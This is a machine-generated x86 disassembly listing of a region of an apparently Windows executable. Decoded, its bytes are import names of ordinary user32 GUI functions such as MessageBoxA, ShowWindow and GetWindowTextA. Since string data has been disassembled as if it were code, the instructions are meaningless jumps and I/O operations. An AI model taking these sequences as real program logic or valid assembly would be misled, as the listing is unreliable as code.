  413bf5:	popa   
  413bf6:	jb     0x413bf8
  413bf8:	xor    al,BYTE PTR [ecx]
  413bfa:	inc    edi
  413bfb:	gs je  0x413c4b
  413bfe:	outs   dx,BYTE PTR gs:[esi]
  413c00:	jne    0x413c4b
  413c02:	je     0x413c69
  413c04:	ins    DWORD PTR es:[edi],dx
  413c05:	inc    ebx
  413c06:	outs   dx,DWORD PTR ds:[esi]
  413c07:	jne    0x413c77
  413c09:	je     0x413c0b
  413c0b:	add    cl,ah
  413c0d:	add    BYTE PTR [esi+0x69],al
  413c10:	outs   dx,BYTE PTR ds:[esi]
  413c11:	fs push edi
  413c13:	imul   ebp,DWORD PTR [esi+0x64],0x41776f
  413c1a:	rol    BYTE PTR [ecx],1
  413c1c:	dec    ebp
  413c1d:	gs jae 0x413c93
  413c20:	popa   
  413c21:	addr16 gs inc edx
  413c24:	outs   dx,DWORD PTR ds:[esi]
  413c25:	js     0x413c6c
  413c27:	js     0x413c80
  413c29:	add    BYTE PTR [eax+0x536e4901],al
  413c2f:	outs   dx,BYTE PTR gs:[esi]
  413c31:	fs dec ebp
  413c33:	gs jae 0x413ca9
  413c36:	popa   
  413c37:	addr16 gs add al,bl
  413c3b:	add    DWORD PTR [ebp+0x6f],ecx
  413c3e:	outs   dx,BYTE PTR ds:[esi]
  413c3f:	imul   esi,DWORD PTR [edi+ebp*2+0x72],0x6d6f7246
  413c47:	push   eax
  413c48:	outs   dx,DWORD PTR ds:[esi]
  413c49:	imul   ebp,DWORD PTR [esi+0x74],0x1680000
  413c50:	inc    edi
  413c51:	gs je  0x413cab
  413c54:	imul   ebp,DWORD PTR [esi+0x64],0x7d00776f
  413c5b:	add    dl,BYTE PTR [ebx+0x68]
  413c5e:	outs   dx,DWORD PTR ds:[esi]
  413c5f:	ja     0x413cb4
  413c61:	arpl   WORD PTR [edx+0x6f],si
  413c64:	ins    BYTE PTR es:[edi],dx
  413c65:	ins    BYTE PTR es:[edi],dx
  413c66:	inc    edx
  413c67:	popa   
  413c68:	jb     0x413c6a
  413c6a:	mov    cl,0x1
  413c6c:	dec    esp
  413c6d:	outs   dx,DWORD PTR ds:[esi]
  413c6e:	popa   
  413c6f:	fs dec ecx
  413c71:	ins    DWORD PTR es:[edi],dx
  413c72:	popa   
  413c73:	addr16 gs inc ecx
  413c76:	add    BYTE PTR [eax],al
  413c78:	cdq    
  413c79:	add    BYTE PTR [ecx+ebp*2+0x61],al
  413c7d:	ins    BYTE PTR es:[edi],dx
  413c7e:	outs   dx,DWORD PTR ds:[esi]
  413c7f:	addr16 inc edx
  413c81:	outs   dx,DWORD PTR ds:[esi]
  413c82:	js     0x413ccd
  413c84:	outs   dx,BYTE PTR ds:[esi]
  413c85:	imul   esi,DWORD PTR fs:[edx+0x65],0x61507463
  413c8d:	jb     0x413cf0
  413c8f:	ins    DWORD PTR es:[edi],dx
  413c90:	inc    ecx
  413c91:	add    ch,al
  413c93:	add    DWORD PTR [ebp+0x61],ecx
  413c96:	jo     0x413cee
  413c98:	imul   esi,DWORD PTR [edx+0x74],0x4b6c6175
  413c9f:	gs jns 0x413ce3
  413ca2:	add    BYTE PTR [eax],al
  413ca4:	sbb    BYTE PTR [edx],al
  413ca6:	push   edx
  413ca7:	gs ins DWORD PTR es:[edi],dx
  413ca9:	outs   dx,DWORD PTR ds:[esi]
  413caa:	jbe    0x413d11
  413cac:	push   eax
  413cad:	jb     0x413d1e
  413caf:	jo     0x413d08
  413cb1:	add    BYTE PTR [ecx+eax*1+0x47],ah
  413cb5:	gs je  0x413d0d
  413cb8:	jo     0x413d1e
  413cba:	popa   
  413cbb:	je     0x413d22
  413cbd:	push   edx
  413cbe:	outs   dx,BYTE PTR ds:[si]
  413cc0:	add    BYTE PTR [eax],al
  413cc2:	add    al,BYTE PTR [edx]
  413cc4:	push   edx
  413cc5:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6c437265
  413cce:	popa   
  413ccf:	jae    0x413d44
  413cd1:	inc    ecx
  413cd2:	add    BYTE PTR [eax],al
  413cd4:	add    dl,BYTE PTR ds:[ebx+0x65]
  413cd8:	je     0x413d1e
  413cda:	ins    BYTE PTR es:[edi],dx
  413cdb:	addr16 dec ecx
  413cdd:	je     0x413d44
  413cdf:	ins    DWORD PTR es:[edi],dx
  413ce0:	push   esp
  413ce1:	gs js  0x413d58
  413ce4:	inc    ecx
  413ce5:	add    BYTE PTR [ebp+0x61724400],dh
  413ceb:	ja     0x413d3a
  413ced:	outs   dx,BYTE PTR gs:[esi]
  413cef:	jne    0x413d33
  413cf1:	popa   
  413cf2:	jb     0x413cf4
  413cf4:	sub    eax,DWORD PTR [ecx]
  413cf6:	inc    edi
  413cf7:	gs je  0x413d47
  413cfa:	outs   dx,BYTE PTR gs:[esi]
  413cfc:	jne    0x413cfe
  413cfe:	repnz add DWORD PTR [eax+0x6f],edx
  413d02:	jae    0x413d78
  413d04:	dec    ebp
  413d05:	gs jae 0x413d7b
  413d08:	popa   
  413d09:	addr16 gs push edi
  413d0c:	add    BYTE PTR [eax],al
  413d0e:	push   cs
  413d0f:	add    DWORD PTR [edi+0x65],eax
  413d12:	je     0x413d58
  413d14:	ins    BYTE PTR es:[edi],dx
  413d15:	addr16 inc ebx
  413d17:	je     0x413d8b
  413d19:	ins    BYTE PTR es:[edi],dx
  413d1a:	dec    ecx
  413d1b:	inc    esp
  413d1c:	add    BYTE PTR [eax],al
  413d1e:	mov    cl,0x2
  413d20:	push   esi
  413d21:	imul   ecx,DWORD PTR [ebx+0x65],0x79
  413d25:	push   ebx
  413d26:	arpl   WORD PTR [ecx+0x6e],sp
  413d29:	push   edi
  413d2a:	add    BYTE PTR [eax],al
  413d2c:	sbb    BYTE PTR [ecx],al
  413d2e:	inc    edi
  413d2f:	gs je  0x413d7b
  413d32:	arpl   WORD PTR [edi+0x6e],bp
  413d35:	dec    ecx
  413d36:	outs   dx,BYTE PTR ds:[esi]
  413d37:	outs   dx,WORD PTR ds:[esi]
  413d39:	add    cl,cl
  413d3b:	add    DWORD PTR [ebp+0x61],ecx
  413d3e:	jo     0x413d97
  413d40:	imul   ebp,DWORD PTR [esi+0x64],0x6f50776f
  413d47:	imul   ebp,DWORD PTR [esi+0x74],0x2d0073
  413d4e:	inc    ebx
  413d4f:	push   0x654e7261
  413d54:	js     0x413dca
  413d56:	push   edi
  413d57:	add    BYTE PTR [ecx],ch
  413d59:	add    dl,BYTE PTR [ebx+0x65]
  413d5c:	outs   dx,BYTE PTR ds:[esi]
  413d5d:	fs dec ebp
  413d5f:	gs jae 0x413dd5
  413d62:	popa   
  413d63:	addr16 gs push esp
  413d66:	imul   ebp,DWORD PTR [ebp+0x65],0x4174756f
  413d6d:	add    BYTE PTR [eax],ch
  413d6f:	add    BYTE PTR [ebx+0x68],al
  413d72:	popa   
  413d73:	jb     0x413dc1
  413d75:	outs   dx,DWORD PTR ds:[esi]
  413d76:	ja     0x413ddd
  413d78:	jb     0x413dbc
  413d7a:	jne    0x413de2
  413d7c:	push   di
  413d7e:	add    BYTE PTR [eax],al
  413d80:	ins    DWORD PTR es:[edi],dx
  413d81:	add    DWORD PTR [edi+0x65],eax
  413d84:	je     0x413ddd
  413d86:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  413d8d:	outs   dx,BYTE PTR ds:[esi]
  413d8e:	addr16 push edi
  413d90:	add    BYTE PTR [eax],al
  413d92:	mov    bh,0x2
  413d94:	push   edi
  413d95:	popa   
  413d96:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x706e4972
  413d9e:	jne    0x413e14
  413da0:	dec    ecx
  413da1:	fs ins BYTE PTR es:[edi],dx
  413da3:	add    BYTE PTR gs:[eax],al
  413da6:	mov    DWORD PTR [ecx],0x5670614d
  413dac:	imul   esi,DWORD PTR [edx+0x74],0x4b6c6175
  413db3:	gs jns 0x413dfb
  413db6:	js     0x413e0f
  413db8:	add    BYTE PTR [eax],al
  413dba:	cmp    eax,0x65684300
  413dbf:	arpl   WORD PTR [ebx+0x52],bp
  413dc2:	popa   
  413dc3:	imul   ebp,DWORD PTR fs:[edi+0x42],0x6f747475
  413dcb:	outs   dx,BYTE PTR ds:[esi]
  413dcc:	add    BYTE PTR [eax],al
  413dce:	add    eax,0x6c6c4100
  413dd3:	outs   dx,DWORD PTR ds:[esi]
  413dd4:	ja     0x413e29
  413dd6:	gs je  0x413e1f
  413dd9:	outs   dx,DWORD PTR ds:[esi]
  413dda:	jb     0x413e41
  413ddc:	addr16 jb 0x413e4e
  413ddf:	jne    0x413e4f
  413de1:	fs push edi
  413de3:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  413dea:	into   
  413deb:	add    DWORD PTR [ebp+0x65],ecx
  413dee:	jae    0x413e63
  413df0:	popa   
  413df1:	addr16 gs inc edx
  413df4:	outs   dx,DWORD PTR ds:[esi]
  413df5:	js     0x413e38
  413df7:	add    BYTE PTR [edx],bh
  413df9:	add    DWORD PTR [edi+0x65],eax
  413dfc:	je     0x413e4b
  413dfe:	gs jae 0x413e74
  413e01:	popa   
  413e02:	addr16 gs inc ecx
  413e05:	add    BYTE PTR [edx+0x2],cl
  413e08:	push   ebx
  413e09:	gs je  0x413e59
  413e0c:	outs   dx,BYTE PTR gs:[esi]
  413e0e:	jne    0x413e54
  413e10:	gs popaw 
  413e13:	jne    0x413e81
  413e15:	je     0x413e60
  413e17:	je     0x413e7e
  413e19:	ins    DWORD PTR es:[edi],dx
  413e1a:	add    BYTE PTR [eax],al
  413e1c:	aad    0x1
  413e1e:	dec    ebp
  413e1f:	gs jae 0x413e95
  413e22:	popa   
  413e23:	addr16 gs inc edx
  413e26:	outs   dx,DWORD PTR ds:[esi]
  413e27:	js     0x413e80
  413e29:	add    BYTE PTR [ecx],bh
  413e2b:	add    DWORD PTR [edi+0x65],eax
  413e2e:	je     0x413e7d
  413e30:	outs   dx,BYTE PTR gs:[esi]
  413e32:	jne    0x413e87
  413e34:	je     0x413ea8
  413e36:	imul   ebp,DWORD PTR [esi+0x67],0xb9000057
  413e3d:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  413e41:	fs dec ebp
  413e43:	outs   dx,BYTE PTR gs:[esi]
  413e45:	jne    0x413e9e
  413e47:	add    BYTE PTR [ecx+eax*1+0x47],bl
  413e4b:	gs je  0x413ea1
  413e4e:	jns    0x413ec3
  413e50:	je     0x413eb7
  413e52:	ins    DWORD PTR es:[edi],dx
  413e53:	dec    ebp
  413e54:	gs je  0x413ec9
  413e57:	imul   esp,DWORD PTR [ebx+0x73],0x2260000
  413e5e:	push   ebx
  413e5f:	outs   dx,BYTE PTR gs:[esi]
  413e61:	fs dec ebp
  413e63:	gs jae 0x413ed9
  413e66:	popa   
  413e67:	addr16 gs inc ecx
  413e6a:	add    BYTE PTR [eax],al
  413e6c:	aaa    
  413e6d:	add    DWORD PTR [edi+0x65],eax
  413e70:	je     0x413ebf
  413e72:	outs   dx,BYTE PTR gs:[esi]
  413e74:	jne    0x413ec9
  413e76:	je     0x413ed9
  413e78:	je     0x413edf
  413e7a:	add    BYTE PTR [eax],al
  413e7c:	mov    bl,0x0
  413e7e:	inc    esp
  413e7f:	jb     0x413ee2
  413e81:	ja     0x413ecc
  413e83:	arpl   WORD PTR [edi+0x6e],bp
  413e86:	add    BYTE PTR [eax],al
  413e88:	xchg   ebp,eax
  413e89:	add    BYTE PTR [ebp+eiz*2+0x73],al
  413e8d:	je     0x413f01
  413e8f:	outs   dx,DWORD PTR ds:[esi]
  413e90:	jns    0x413ed5
  413e92:	jne    0x413f06
  413e94:	jae    0x413f05
  413e96:	jb     0x413e98
  413e98:	add    al,BYTE PTR [eax]
  413e9a:	inc    ecx
  413e9b:	fs push 0x75
  413e9e:	jae    0x413f14
  413ea0:	push   edi
  413ea1:	imul   ebp,DWORD PTR [esi+0x64],0x6552776f
  413ea8:	arpl   WORD PTR [eax+eax*1+0x0],si
  413eac:	pop    ecx
  413ead:	add    DWORD PTR [edi+0x65],eax
  413eb0:	je     0x413f05
  413eb2:	jns    0x413f27
  413eb4:	inc    ebx
  413eb5:	outs   dx,DWORD PTR ds:[esi]
  413eb6:	ins    BYTE PTR es:[edi],dx
  413eb7:	outs   dx,DWORD PTR ds:[esi]
  413eb8:	jb     0x413eba
  413eba:	jle    0x413ebd
  413ebc:	dec    eax
  413ebd:	imul   ebp,DWORD PTR [ecx+ebp*2+0x74],0x6e654d65
  413ec5:	jne    0x413f10
  413ec7:	je     0x413f2e
  413ec9:	ins    DWORD PTR es:[edi],dx
  413eca:	add    BYTE PTR [eax],al
  413ecc:	or     DWORD PTR [eax],eax
  413ece:	inc    ecx
  413ecf:	jo     0x413f41
  413ed1:	outs   dx,BYTE PTR gs:[esi]
  413ed3:	fs dec ebp
  413ed5:	outs   dx,BYTE PTR gs:[esi]
  413ed7:	jne    0x413f30
  413ed9:	add    BYTE PTR [eax+eax*1],bh
  413edc:	inc    ebx
  413edd:	push   0x4d6b6365
  413ee2:	outs   dx,BYTE PTR gs:[esi]
  413ee4:	jne    0x413f38
  413ee6:	popa   
  413ee7:	imul   ebp,DWORD PTR fs:[edi+0x49],0x6d6574
  413eef:	add    BYTE PTR [ecx+eax*1+0x64616f4c],bh
  413ef6:	push   ebx
  413ef7:	je     0x413f6b
  413ef9:	imul   ebp,DWORD PTR [esi+0x67],0x21f0057
  413f00:	push   ebx
  413f01:	arpl   WORD PTR [edx+0x6f],si
  413f04:	ins    BYTE PTR es:[edi],dx
  413f05:	ins    BYTE PTR es:[edi],dx
  413f06:	push   edi
  413f07:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  413f0e:	xor    DWORD PTR [eax],eax
  413f10:	inc    ebx
  413f11:	push   0x72507261
  413f16:	gs jbe 0x413f70
  413f19:	add    BYTE PTR [edi+0x2],bl
  413f1c:	push   ebx
  413f1d:	gs je  0x413f73
  413f20:	jns    0x413f95
  413f22:	inc    ebx
  413f23:	outs   dx,DWORD PTR ds:[esi]
  413f24:	ins    BYTE PTR es:[edi],dx
  413f25:	outs   dx,DWORD PTR ds:[esi]
  413f26:	jb     0x413f9b
  413f28:	add    BYTE PTR [eax],al
  413f2a:	sgdtd  [edi+0x65]
  413f2e:	je     0x413f74
  413f30:	ins    BYTE PTR es:[edi],dx
  413f31:	addr16 dec ecx
  413f33:	je     0x413f9a
  413f35:	ins    DWORD PTR es:[edi],dx
  413f36:	add    BYTE PTR [eax],al
  413f38:	dec    esp
  413f39:	add    dl,BYTE PTR [ebx+0x65]
  413f3c:	je     0x413f8b
  413f3e:	outs   dx,BYTE PTR gs:[esi]
  413f40:	jne    0x413f8b
  413f42:	je     0x413fa9
  413f44:	ins    DWORD PTR es:[edi],dx
  413f45:	inc    edx
  413f46:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x7370
  413f4e:	or     al,0x1
  413f50:	inc    edi
  413f51:	gs je  0x413f98
  413f54:	gs jae 0x413fc2
  413f57:	je     0x413fc8
  413f59:	jo     0x413fb2
  413f5b:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  413f62:	inc    ebp
  413f63:	add    DWORD PTR [edi+0x65],eax
  413f66:	je     0x413fb8
  413f68:	popa   
  413f69:	jb     0x413fd0
  413f6b:	outs   dx,BYTE PTR ds:[esi]
  413f6c:	je     0x413f6e
  413f6e:	mov    BYTE PTR [eax],0x45
  413f71:	outs   dx,BYTE PTR ds:[esi]
  413f72:	fs push esp
  413f74:	popa   
  413f75:	jae    0x413fe2
  413f77:	add    BYTE PTR [eax+0x0],ah
  413f7a:	inc    ebx
  413f7b:	jb     0x413fe2
  413f7d:	popa   
  413f7e:	je     0x413fe5
  413f80:	dec    ebp
  413f81:	outs   dx,BYTE PTR gs:[esi]
  413f83:	jne    0x413f85
  413f85:	add    bl,dh
  413f87:	add    BYTE PTR [edi+0x65],al
  413f8a:	je     0x413fcf
  413f8c:	popa   
  413f8d:	jb     0x413ff4
  413f8f:	je     0x413fe1
  413f91:	outs   dx,DWORD PTR ds:[esi]
  413f92:	jae    0x413f94
  413f94:	sub    eax,DWORD PTR [edx]
  413f96:	push   ebx
  413f97:	outs   dx,BYTE PTR gs:[esi]
  413f99:	fs dec ebp
  413f9b:	gs jae 0x414011
  413f9e:	popa   
  413f9f:	addr16 gs push edi
  413fa2:	add    BYTE PTR [eax],al
  413fa4:	test   DWORD PTR [ecx],eax
  413fa6:	dec    ecx
  413fa7:	outs   dx,BYTE PTR ds:[esi]
  413fa8:	jae    0x41400f
  413faa:	jb     0x414020
  413fac:	dec    ebp
  413fad:	outs   dx,BYTE PTR gs:[esi]
  413faf:	jne    0x413ffa
  413fb1:	je     0x414018
  413fb3:	ins    DWORD PTR es:[edi],dx
  413fb4:	push   edi
  413fb5:	add    BYTE PTR [ecx+0x0],ah
  413fb8:	inc    ebx
  413fb9:	jb     0x414020
  413fbb:	popa   
  413fbc:	je     0x414023
  413fbe:	push   eax
  413fbf:	outs   dx,DWORD PTR ds:[esi]
  413fc0:	jo     0x414037
  413fc2:	jo     0x414011
  413fc4:	outs   dx,BYTE PTR gs:[esi]
  413fc6:	jne    0x413fc8
  413fc8:	inc    eax
  413fc9:	add    DWORD PTR [edi+0x65],eax
  413fcc:	je     0x41401b
  413fce:	outs   dx,DWORD PTR ds:[esi]
  413fcf:	outs   dx,BYTE PTR ds:[esi]
  413fd0:	imul   esi,DWORD PTR [edi+ebp*2+0x72],0x6f666e49
  413fd8:	push   edi
  413fd9:	add    al,cl
  413fdb:	add    DWORD PTR [ebp+0x61],ecx
  413fde:	jo     0x414036
  413fe0:	imul   esi,DWORD PTR [edx+0x74],0x4b6c6175
  413fe7:	gs jns 0x414041
  413fea:	add    BYTE PTR [eax],al
  413fec:	out    0x0,eax
  413fee:	inc    esi
  413fef:	jb     0x414052
  413ff1:	ins    DWORD PTR es:[edi],dx
  413ff2:	gs push edx
  413ff4:	arpl   WORD PTR gs:[eax+eax*1-0x41],si
  413ff9:	add    BYTE PTR [ebp+0x6e],al
  413ffc:	popa   
  413ffd:	bound  ebp,QWORD PTR [ebp+eiz*2+0x4d]
  414001:	outs   dx,BYTE PTR gs:[esi]
  414003:	jne    0x41404e
  414005:	je     0x41406c
  414007:	ins    DWORD PTR es:[edi],dx
  414008:	add    BYTE PTR [eax],al
  41400a:	fwait
  41400b:	add    dl,BYTE PTR [ebp+0x6e]
  41400e:	ins    BYTE PTR es:[edi],dx
  41400f:	outs   dx,DWORD PTR ds:[esi]
  414010:	popa   
  414011:	fs dec ebx
  414013:	gs jns 0x414078
  414016:	outs   dx,DWORD PTR ds:[esi]
  414017:	popa   
  414018:	jb     0x41407e
  41401a:	dec    esp
  41401b:	popa   
  41401c:	jns    0x41408d
  41401e:	jne    0x414094
  414020:	add    BYTE PTR [eax],al
  414022:	mov    esp,0x6e695702
  414027:	outs   dx,DWORD PTR fs:[esi]
  414029:	ja     0x414071
  41402b:	jb     0x41409c
  41402d:	ins    DWORD PTR es:[edi],dx
  41402e:	push   eax
  41402f:	outs   dx,DWORD PTR ds:[esi]
  414030:	imul   ebp,DWORD PTR [esi+0x74],0x4400ab00
  414037:	jb     0x41409a
  414039:	ja     0x41407c
  41403b:	outs   dx,BYTE PTR ds:[esi]
  41403c:	imul   ebp,DWORD PTR [ebp+0x61],0x52646574
  414043:	arpl   WORD PTR gs:[ebx+esi*2+0x0],si
  414048:	and    BYTE PTR [edx],al
  41404a:	push   ebx
  41404b:	arpl   WORD PTR [edx+0x6f],si
  41404e:	ins    BYTE PTR es:[edi],dx
  41404f:	ins    BYTE PTR es:[edi],dx
  414050:	push   edi
  414051:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  414058:	add    BYTE PTR [eax],al
  41405a:	pop    eax
  41405b:	add    dl,BYTE PTR [ebx+0x65]
  41405e:	je     0x4140b2
  414060:	arpl   WORD PTR gs:[eax+eax*1+0x3d],si
  414065:	add    dl,BYTE PTR [ebx+0x65]
  414068:	je     0x4140ae
  41406a:	ins    BYTE PTR es:[edi],dx
  41406b:	addr16 dec ecx
  41406d:	je     0x4140d4
  41406f:	ins    DWORD PTR es:[edi],dx
  414070:	dec    ecx
  414071:	outs   dx,BYTE PTR ds:[esi]
  414072:	je     0x414074
  414074:	or     eax,0x67654200
  414079:	imul   ebp,DWORD PTR [esi+0x50],0x746e6961
  414080:	add    BYTE PTR [eax],al
  414082:	pop    ebp
  414083:	add    BYTE PTR [ebx+0x72],al
  414086:	gs popa 
  414088:	je     0x4140ef
  41408a:	dec    ecx
  41408b:	arpl   WORD PTR [edi+0x6e],bp
  41408e:	dec    ecx
  41408f:	outs   dx,BYTE PTR ds:[esi]
  414090:	imul   esi,DWORD PTR fs:[edx+0x65],0x7463
  414098:	dec    esi
  414099:	add    dl,BYTE PTR [ebx+0x65]
  41409c:	je     0x4140eb
  41409e:	outs   dx,BYTE PTR gs:[esi]
  4140a0:	jne    0x4140eb
  4140a2:	je     0x414109
  4140a4:	ins    DWORD PTR es:[edi],dx
  4140a5:	dec    ecx
  4140a6:	outs   dx,BYTE PTR ds:[esi]
  4140a7:	outs   dx,WORD PTR ds:[esi]
  4140a9:	push   edi
  4140aa:	add    BYTE PTR [eax],al
  4140ac:	pop    edx
  4140ad:	add    dl,BYTE PTR [ebx+0x65]
  4140b0:	je     0x414105
  4140b2:	arpl   WORD PTR [edx+0x6f],si
  4140b5:	ins    BYTE PTR es:[edi],dx
  4140b6:	ins    BYTE PTR es:[edi],dx
  4140b7:	dec    ecx
  4140b8:	outs   dx,BYTE PTR ds:[esi]
  4140b9:	outs   dx,WORD PTR ds:[esi]
  4140bb:	add    BYTE PTR [edx],dh
  4140bd:	add    BYTE PTR [ebx+0x68],al
  4140c0:	popa   
  4140c1:	jb     0x414117
  4140c3:	outs   dx,DWORD PTR ds:[esi]
  4140c4:	dec    edi
  4140c5:	gs ins DWORD PTR es:[edi],dx
  4140c7:	inc    ecx
  4140c8:	add    BYTE PTR [eax],al
  4140ca:	sub    eax,0x6e655302
  4140cf:	fs dec esi
  4140d1:	outs   dx,DWORD PTR ds:[esi]
  4140d2:	je     0x41413d
  4140d4:	data16 jns 0x414124
  4140d7:	gs jae 0x41414d
  4140da:	popa   
  4140db:	addr16 gs push edi
  4140de:	add    BYTE PTR [eax],al
  4140e0:	sti    
  4140e1:	add    BYTE PTR [edi+0x65],al
  4140e4:	je     0x414129
  4140e6:	ins    BYTE PTR es:[edi],dx
  4140e7:	popa   
  4140e8:	jae    0x41415d
  4140ea:	dec    esi
  4140eb:	popa   
  4140ec:	ins    DWORD PTR es:[edi],dx
  4140ed:	gs push edi
  4140ef:	add    BYTE PTR [ebx+0x61725402],dl
  4140f5:	outs   dx,BYTE PTR ds:[esi]
  4140f6:	jae    0x414164
  4140f8:	popa   
  4140f9:	je     0x414160
  4140fb:	inc    ecx
  4140fc:	arpl   WORD PTR [ebx+0x65],sp
  4140ff:	ins    BYTE PTR es:[edi],dx
  414100:	gs jb  0x414164
  414103:	je     0x414174
  414105:	jb     0x414148
  414107:	add    BYTE PTR [ebx+0x2],bh
  41410a:	push   ebx
  41410b:	push   0x7543776f
  414110:	jb     0x414185
  414112:	outs   dx,DWORD PTR ds:[esi]
  414113:	jb     0x414115
  414115:	add    BYTE PTR [ebx+0x2],dh
  414118:	push   ebx
  414119:	gs je  0x414173
  41411c:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  414123:	js     0x414199
  414125:	inc    ecx
  414126:	add    BYTE PTR [eax],al
  414128:	add    BYTE PTR es:[ebx+0x68],al
  41412c:	popa   
  41412d:	jb     0x41417b
  41412f:	outs   dx,DWORD PTR ds:[esi]
  414130:	ja     0x414197
  414132:	jb     0x414175
  414134:	add    BYTE PTR [eax],al
  414136:	xchg   BYTE PTR [ecx],al
  414138:	dec    ecx
  414139:	outs   dx,BYTE PTR ds:[esi]
  41413a:	jae    0x4141a1
  41413c:	jb     0x4141b2
  41413e:	dec    ebp
  41413f:	outs   dx,BYTE PTR gs:[esi]
  414141:	jne    0x41419a
  414143:	add    BYTE PTR [eax],cl
  414145:	add    BYTE PTR [ecx+0x70],al
  414148:	jo     0x4141af
  41414a:	outs   dx,BYTE PTR ds:[esi]
  41414b:	fs dec ebp
  41414d:	outs   dx,BYTE PTR gs:[esi]
  41414f:	jne    0x414192
  414151:	add    BYTE PTR [edx+0x1],ch
  414154:	inc    edi
  414155:	gs je  0x4141af
  414158:	imul   ebp,DWORD PTR [esi+0x64],0x4344776f
  41415f:	add    BYTE PTR [ecx+0x2],bl
  414162:	push   ebx
  414163:	gs je  0x4141b8
  414166:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  41416b:	jo     0x4141e1
  41416d:	jns    0x41416f
  41416f:	add    BYTE PTR [edx+0x1],bl
  414172:	inc    edi
  414173:	gs je  0x4141c9
  414176:	jns    0x4141eb
  414178:	inc    ebx
  414179:	outs   dx,DWORD PTR ds:[esi]
  41417a:	ins    BYTE PTR es:[edi],dx
  41417b:	outs   dx,DWORD PTR ds:[esi]
  41417c:	jb     0x4141c0
  41417e:	jb     0x4141f5
  414180:	jae    0x4141ea
  414182:	add    BYTE PTR [eax],al
  414184:	jg     0x414188
  414186:	push   ebx
  414187:	push   0x6957776f
  41418c:	outs   dx,BYTE PTR ds:[esi]
  41418d:	outs   dx,DWORD PTR fs:[esi]
  41418f:	ja     0x414191
  414191:	add    BYTE PTR [eax+eax*1],ah
  414194:	inc    ebx
  414195:	push   0x65676e61
  41419a:	dec    ebp
  41419b:	outs   dx,BYTE PTR gs:[esi]
  41419d:	jne    0x4141f6
  41419f:	add    al,ah
  4141a1:	add    DWORD PTR [edi+0x65],ecx
  4141a4:	ins    DWORD PTR es:[edi],dx
  4141a5:	push   esp
  4141a6:	outs   dx,DWORD PTR ds:[esi]
  4141a7:	inc    ebx
  4141a8:	push   0x417261
  4141ad:	add    BYTE PTR [edi+0x43734901],cl
  4141b3:	push   0x6c417261
  4141b8:	jo     0x414222
  4141ba:	popa   
  4141bb:	push   edi
  4141bc:	add    BYTE PTR [eax],al
  4141be:	xchg   BYTE PTR [edx],al
  4141c0:	push   ebx
  4141c1:	jns    0x414236
  4141c3:	je     0x41422a
  4141c5:	ins    DWORD PTR es:[edi],dx
  4141c6:	push   eax
  4141c7:	popa   
  4141c8:	jb     0x41422b
  4141ca:	ins    DWORD PTR es:[edi],dx
  4141cb:	gs je  0x414233
  4141ce:	jb     0x414243
  4141d0:	dec    ecx
  4141d1:	outs   dx,BYTE PTR ds:[esi]
  4141d2:	outs   dx,WORD PTR ds:[esi]
  4141d4:	push   edi
  4141d5:	add    BYTE PTR ds:0x67655202,al
  4141db:	imul   esi,DWORD PTR [ebx+0x74],0x6c437265
  4141e2:	popa   
  4141e3:	jae    0x414258
  4141e5:	push   edi
  4141e6:	add    BYTE PTR [eax],al
  4141e8:	add    BYTE PTR [edx],0x53
  4141eb:	push   0x6957776f
  4141f0:	outs   dx,BYTE PTR ds:[esi]
  4141f1:	outs   dx,DWORD PTR fs:[esi]
  4141f3:	ja     0x414236
  4141f5:	jae    0x414270
  4141f7:	outs   dx,BYTE PTR ds:[esi]
  4141f8:	arpl   WORD PTR [eax],ax
  4141fa:	mov    edi,0x70737702
  4141ff:	jb     0x41426a
  414201:	outs   dx,BYTE PTR ds:[esi]
  414202:	je     0x41426a
  414204:	inc    ecx
  414205:	add    BYTE PTR [esi+0x2],ch
  414208:	push   ebx
  414209:	gs je  0x414263
  41420c:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  414213:	outs   dx,BYTE PTR ds:[esi]
  414214:	addr16 push edi
  414216:	add    BYTE PTR [eax],al
  414218:	test   BYTE PTR [edx],al
  41421a:	push   ebx
  41421b:	ja     0x414286
  41421d:	je     0x414282
  41421f:	push   0x68546f54
  414224:	imul   esi,DWORD PTR [ebx+0x57],0x6f646e69
  41422b:	ja     0x41422d
  41422d:	add    al,al
  41422f:	add    dh,BYTE PTR [edi+0x73]
  414232:	jo     0x4142a6
  414234:	imul   ebp,DWORD PTR [esi+0x74],0x97005766
  41423b:	add    DWORD PTR [ecx+0x73],ecx
  41423e:	inc    esp
  41423f:	imul   esp,DWORD PTR [ecx+0x6c],0x654d676f
  414246:	jae    0x4142bb
  414248:	popa   
  414249:	addr16 gs inc ecx
  41424c:	add    BYTE PTR [eax],al
  41424e:	daa    
  41424f:	add    DWORD PTR [edi+0x65],eax
  414252:	je     0x41429f
  414254:	gs jns 0x4142b9
  414257:	outs   dx,DWORD PTR ds:[esi]
  414258:	popa   
  414259:	jb     0x4142bf
  41425b:	push   esp
  41425c:	jns    0x4142ce
  41425e:	gs add bh,al
  414261:	add    BYTE PTR [ebp+0x6e],al
  414264:	jne    0x4142d3
  414266:	inc    ebx
  414267:	push   0x57646c69
  41426c:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  414273:	add    BYTE PTR [ebp+0x53],dl
  414276:	inc    ebp
  414277:	push   edx
  414278:	xor    esi,DWORD PTR [edx]
  41427a:	cs fs ins BYTE PTR es:[edi],dx
  41427d:	ins    BYTE PTR es:[edi],dx
  41427e:	add    BYTE PTR [eax],al
  414280:	lods   al,BYTE PTR ds:[esi]
  414281:	add    BYTE PTR [ebx+0x72],al
  414284:	gs popa 
  414286:	je     0x4142ed
  414288:	push   edx
  414289:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  41428e:	outs   dx,BYTE PTR ds:[esi]
  41428f:	dec    ecx
  414290:	outs   dx,BYTE PTR ds:[esi]
  414291:	imul   esi,DWORD PTR fs:[edx+0x65],0x89007463
  414299:	add    BYTE PTR [ebx+0x72],al
  41429c:	gs popa 
  41429e:	je     0x414305
  4142a0:	inc    edx
  4142a1:	jb     0x414318
  4142a3:	jae    0x41430d
